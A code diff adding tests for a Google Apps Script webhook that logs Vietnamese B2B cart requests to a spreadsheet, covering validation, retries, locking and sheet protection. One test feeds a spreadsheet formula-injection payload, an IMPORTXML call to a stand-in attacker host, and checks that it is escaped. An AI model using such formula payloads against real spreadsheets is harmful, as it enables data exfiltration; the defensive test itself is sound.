@@ -6,6 +6,7 @@ import test from "node:test";
 async function loadTemplate(uuids = ["abcd1234-0000-0000-0000-000000000000"]) {
   const rows = [];
   const toasts = [];
+  const operations = [];
   const effectiveOwner = "owner@example.test";
   let uuidIndex = 0;
 
@@ -26,6 +27,7 @@ async function loadTemplate(uuids = ["abcd1234-0000-0000-0000-000000000000"]) {
     }
 
     setValues(values) {
+      operations.push({ method: "setValues", rows: values.length, sheet: this.sheet.getName() });
       values.forEach((valueRow, rowOffset) => valueRow.forEach((value, columnOffset) => {
         this.sheet.setCell(this.row + rowOffset, this.column + columnOffset, value);
       }));
@@ -102,6 +104,7 @@ async function loadTemplate(uuids = ["abcd1234-0000-0000-0000-000000000000"]) {
     }
 
     appendRow(row) {
+      operations.push({ method: "appendRow", rows: 1, sheet: this.name });
       const targetRow = this.getLastRow() + 1;
       row.forEach((value, index) => this.setCell(targetRow, index + 1, value));
       if (this.name === "Yêu cầu") rows.push(row);
@@ -129,7 +132,29 @@ async function loadTemplate(uuids = ["abcd1234-0000-0000-0000-000000000000"]) {
     insertSheet(name) { const sheet = new FakeSheet(name); sheets.set(name, sheet); return sheet; },
     toast(message) { toasts.push(message); },
   };
+  const lock = {
+    available: true,
+    calls: [],
+    held: false,
+    tryLock(timeout) {
+      this.calls.push(timeout);
+      if (!this.available) return false;
+      this.held = true;
+      return true;
+    },
+    releaseLock() { this.held = false; },
+  };
+  const cache = {
+    store: new Map(),
+    puts: [],
+    get(key) { return this.store.has(key) ? this.store.get(key) : null; },
+    put(key, value, seconds) {
+      this.puts.push({ key, seconds, value });
+      this.store.set(key, value);
+    },
+  };
   const context = vm.createContext({
+    CacheService: { getScriptCache: () => cache },
     ContentService: {
       MimeType: { JSON: "application/json" },
       createTextOutput(value) {
@@ -137,6 +162,7 @@ async function loadTemplate(uuids = ["abcd1234-0000-0000-0000-000000000000"]) {
       },
     },
     JSON,
+    LockService: { getScriptLock: () => lock },
     PropertiesService: { getScriptProperties: () => ({ getProperty: () => "shared-secret" }) },
     Session: { getEffectiveUser: () => "owner@example.test", getScriptTimeZone: () => "Asia/Ho_Chi_Minh" },
     SpreadsheetApp: {
@@ -157,7 +183,7 @@ async function loadTemplate(uuids = ["abcd1234-0000-0000-0000-000000000000"]) {
   });
   const source = await readFile(new URL("../docs/google-apps-script-contact-webhook.gs", import.meta.url), "utf8");
   vm.runInContext(source, context);
-  return { context, rows, sheets, toasts };
+  return { cache, context, lock, operations, rows, sheets, toasts };
 }
 
 function submit(context, payload) {
@@ -382,6 +408,259 @@ test("restores invalid status edits, including terminal reopens, without timesta
     assert.equal(requestSheet.getCell(row, 15), "unchanged");
   }
   assert.deepEqual(toasts, Array(5).fill("Trạng thái hoặc người phụ trách không hợp lệ."));
+});
+
+const validCartPayload = {
+  cart: [
+    {
+      index: 1,
+      line_total: 2_100_000,
+      note: "SKU B2B-DEMO-VANILLA",
+      product: "Bột dinh dưỡng",
+      qty: 25,
+      unit: "gói",
+      unit_price: 84_000,
+      variant: "Vị vani",
+    },
+    {
+      index: 2,
+      line_total: "",
+      note: "SKU B2B-DEMO-LOWSUGAR · Liên hệ báo giá",
+      product: "Bột dinh dưỡng",
+      qty: 30,
+      unit: "gói",
+      unit_price: "",
+      variant: "Vị ít ngọt",
+    },
+  ],
+  cart_price_incomplete: true,
+  cart_subtotal: 2_100_000,
+  email: "customer@example.test",
+  message: "Cần báo giá cho 2 vị.",
+  name: "Nguyễn Văn A",
+  phone: "0900000000",
+  product: "Giỏ hàng (2 dòng)",
+  qty: "",
+  request_id: "6b1e0f7a-6c2f-4c1a-9c3e-8f5b2d0a1e44",
+  request_type: "Tư vấn số lượng lớn",
+  secret: "shared-secret",
+  service: "",
+  source: "/gui-yeu-cau/",
+  variant: "",
+};
+
+function detailRow(sheet, row, columns = 9) {
+  return Array.from({ length: columns }, (_, index) => sheet.getCell(row, index + 1));
+}
+
+test("writes cart detail rows before the Yêu cầu row that commits them", async () => {
+  const { context, operations, rows, sheets } = await loadTemplate();
+
+  const response = JSON.parse(submit(context, validCartPayload).value);
+
+  assert.deepEqual(response, { ok: true, reference: "YC-20260725-100000-ABCD1234" });
+  const detailWrite = operations.findIndex((entry) => entry.sheet === "Chi tiết giỏ hàng" && entry.rows === 2);
+  const requestWrite = operations.findIndex((entry) => entry.sheet === "Yêu cầu" && entry.method === "appendRow" && entry.rows === 1);
+  assert.notEqual(detailWrite, -1);
+  assert.ok(detailWrite < requestWrite, "detail rows must be written before the request row");
+  assert.equal(operations.filter((entry) => entry.sheet === "Chi tiết giỏ hàng" && entry.method === "setValues").length, 1);
+  assert.equal(rows.length, 2);
+  assert.equal(sheets.get("Chi tiết giỏ hàng").getLastRow(), 3);
+});
+
+test("keeps the cart Yêu cầu row at the exact 15 columns with a summarized D and blank E:F", async () => {
+  const { context, rows } = await loadTemplate();
+
+  const response = JSON.parse(submit(context, validCartPayload).value);
+
+  assert.equal(rows[1].length, 15);
+  assert.equal(rows[1][0], response.reference);
+  assert.equal(rows[1][2], "Tư vấn số lượng lớn");
+  assert.equal(rows[1][3], "Giỏ hàng (2 dòng)");
+  assert.equal(rows[1][4], "");
+  assert.equal(rows[1][5], "");
+  assert.deepEqual(Array.from(rows[1].slice(6, 11)), [
+    "Nguyễn Văn A",
+    "0900000000",
+    "customer@example.test",
+    "Cần báo giá cho 2 vị.",
+    "/gui-yeu-cau/",
+  ]);
+  assert.deepEqual(Array.from(rows[1].slice(11, 14)), ["Mới", "", ""]);
+  assertTimestamp(rows[1][1]);
+  assertTimestamp(rows[1][14]);
+});
+
+test("writes the exact nine detail columns keyed by the parent Mã", async () => {
+  const { context, sheets } = await loadTemplate();
+
+  const reference = JSON.parse(submit(context, validCartPayload).value).reference;
+  const detailSheet = sheets.get("Chi tiết giỏ hàng");
+
+  assert.deepEqual(detailRow(detailSheet, 1), [
+    "Mã", "Dòng", "Sản phẩm", "Biến thể", "Đơn vị", "Số lượng", "Đơn giá", "Thành tiền", "Ghi chú hệ thống",
+  ]);
+  assert.equal(detailSheet.frozenRows, 1);
+  assert.deepEqual(detailRow(detailSheet, 2), [
+    reference, 1, "Bột dinh dưỡng", "Vị vani", "gói", 25, 84_000, 2_100_000, "SKU B2B-DEMO-VANILLA",
+  ]);
+  assert.deepEqual(detailRow(detailSheet, 3), [
+    reference, 2, "Bột dinh dưỡng", "Vị ít ngọt", "gói", 30, "", "", "SKU B2B-DEMO-LOWSUGAR · Liên hệ báo giá",
+  ]);
+  assert.equal(detailSheet.getCell(2, 10), "");
+});
+
+test("neutralizes formula-shaped detail text before writing it", async () => {
+  const { context, sheets } = await loadTemplate();
+
+  submit(context, {
+    ...validCartPayload,
+    cart: [{
+      index: 1,
+      line_total: 2_100_000,
+      note: "@SKU B2B-DEMO-VANILLA",
+      product: "=IMPORTXML(\"https://attacker.example\", \"//x\")",
+      qty: 25,
+      unit: "-gói",
+      unit_price: 84_000,
+      variant: "+Vị vani",
+    }],
+  });
+
+  const detailSheet = sheets.get("Chi tiết giỏ hàng");
+  assert.deepEqual(detailRow(detailSheet, 2), [
+    "YC-20260725-100000-ABCD1234",
+    1,
+    "'=IMPORTXML(\"https://attacker.example\", \"//x\")",
+    "'+Vị vani",
+    "'-gói",
+    25,
+    84_000,
+    2_100_000,
+    "'@SKU B2B-DEMO-VANILLA",
+  ]);
+});
+
+test("refuses a cart line whose money is a numeric string instead of a number", async () => {
+  const { context, rows, sheets } = await loadTemplate();
+
+  const response = JSON.parse(submit(context, {
+    ...validCartPayload,
+    cart: [{ ...validCartPayload.cart[0], line_total: "2100000", unit_price: "84000" }],
+  }).value);
+
+  assert.deepEqual(response, { ok: false, reference: "" });
+  assert.equal(rows.length, 0);
+  assert.equal(sheets.has("Chi tiết giỏ hàng"), false);
+});
+
+test("rejects malformed cart payloads without writing any row", async () => {
+  const { context, rows, sheets } = await loadTemplate();
+  const invalidPayloads = [
+    { ...validCartPayload, cart: [] },
+    { ...validCartPayload, cart: "not-an-array" },
+    { ...validCartPayload, cart: Array.from({ length: 21 }, (_, index) => ({ ...validCartPayload.cart[0], index: index + 1 })) },
+    { ...validCartPayload, request_type: "Tư vấn dịch vụ" },
+    { ...validCartPayload, service: "Sấy & thực phẩm sấy" },
+    { ...validCartPayload, variant: "Vị vani" },
+    { ...validCartPayload, qty: 55 },
+    { ...validCartPayload, cart: [{ ...validCartPayload.cart[0], qty: "25" }] },
+    { ...validCartPayload, cart: [{ ...validCartPayload.cart[0], product: "" }] },
+    { ...validCartPayload, cart: [{ ...validCartPayload.cart[0], index: 0 }] },
+    { ...validCartPayload, product: "" },
+    { ...validCartPayload, request_id: "not-a-uuid" },
+    { ...validCartPayload, secret: "wrong-secret" },
+  ];
+
+  for (const payload of invalidPayloads) {
+    assert.deepEqual(
+      JSON.parse(submit(context, payload).value),
+      { ok: false, reference: "" },
+      JSON.stringify(payload).slice(0, 120),
+    );
+  }
+  assert.equal(rows.length, 0);
+  assert.equal(sheets.has("Chi tiết giỏ hàng"), false);
+});
+
+test("replays the same reference for a retried request id without duplicating rows", async () => {
+  const { cache, context, rows, sheets } = await loadTemplate([
+    "abcd1234-0000-0000-0000-000000000000",
+    "dcba4321-0000-0000-0000-000000000000",
+  ]);
+
+  const first = JSON.parse(submit(context, validCartPayload).value);
+  const retry = JSON.parse(submit(context, validCartPayload).value);
+
+  assert.equal(retry.ok, true);
+  assert.equal(retry.reference, first.reference);
+  assert.equal(rows.length, 2);
+  assert.equal(sheets.get("Chi tiết giỏ hàng").getLastRow(), 3);
+  assert.equal(cache.puts.length, 1);
+  assert.ok(cache.puts[0].key.includes(validCartPayload.request_id));
+  assert.equal(cache.puts[0].value, first.reference);
+  assert.ok(cache.puts[0].seconds > 0);
+
+  const distinct = JSON.parse(submit(context, {
+    ...validCartPayload,
+    request_id: "11111111-2222-4333-8444-555555555555",
+  }).value);
+  assert.notEqual(distinct.reference, first.reference);
+  assert.equal(rows.length, 3);
+});
+
+test("gives up inside the Next timeout budget when the script lock is unavailable", async () => {
+  const { context, lock, rows, sheets } = await loadTemplate();
+  lock.available = false;
+
+  const response = JSON.parse(submit(context, validCartPayload).value);
+
+  assert.deepEqual(response, { ok: false, reference: "" });
+  assert.equal(rows.length, 0);
+  assert.equal(sheets.has("Chi tiết giỏ hàng"), false);
+  assert.equal(lock.calls.length, 1);
+  assert.ok(lock.calls[0] <= 2_500, `lock timeout ${lock.calls[0]} must stay under the 5s Next abort`);
+  assert.equal(lock.held, false);
+});
+
+test("releases the script lock after a successful cart write", async () => {
+  const { context, lock } = await loadTemplate();
+
+  submit(context, validCartPayload);
+
+  assert.equal(lock.held, false);
+  assert.equal(lock.calls.length, 1);
+});
+
+test("protects the whole cart detail tab with no operational range", async () => {
+  const { context, sheets } = await loadTemplate();
+  context.setupRequestWorkbook();
+  context.setupRequestWorkbook();
+
+  const detailSheet = sheets.get("Chi tiết giỏ hàng");
+  assert.ok(detailSheet, "setupRequestWorkbook must create the cart detail tab");
+  assert.deepEqual(detailRow(detailSheet, 1), [
+    "Mã", "Dòng", "Sản phẩm", "Biến thể", "Đơn vị", "Số lượng", "Đơn giá", "Thành tiền", "Ghi chú hệ thống",
+  ]);
+  const protections = detailSheet.getProtections();
+  assert.equal(protections.length, 1);
+  assert.equal(protections[0].unprotectedRanges.length, 0);
+  assert.equal(protections[0].getDescription(), "Lean V1: Chi tiết giỏ hàng chỉ đọc");
+  assert.deepEqual(protections[0].getEditors(), ["owner@example.test"]);
+  assert.equal(protections[0].canDomainEdit(), false);
+  assert.equal(protections[0].isWarningOnly(), false);
+  assert.equal(detailSheet.removedProtections.length, 0);
+  assert.equal(detailSheet.getValidation(2, 1), undefined);
+});
+
+test("keeps existing cart detail rows when setup runs again", async () => {
+  const { context, sheets } = await loadTemplate();
+  submit(context, validCartPayload);
+  const before = detailRow(sheets.get("Chi tiết giỏ hàng"), 2);
+
+  context.setupRequestWorkbook();
+
+  assert.deepEqual(detailRow(sheets.get("Chi tiết giỏ hàng"), 2), before);
 });
 
 test("does not timestamp edits outside Yêu cầu data columns L:N", async () => {
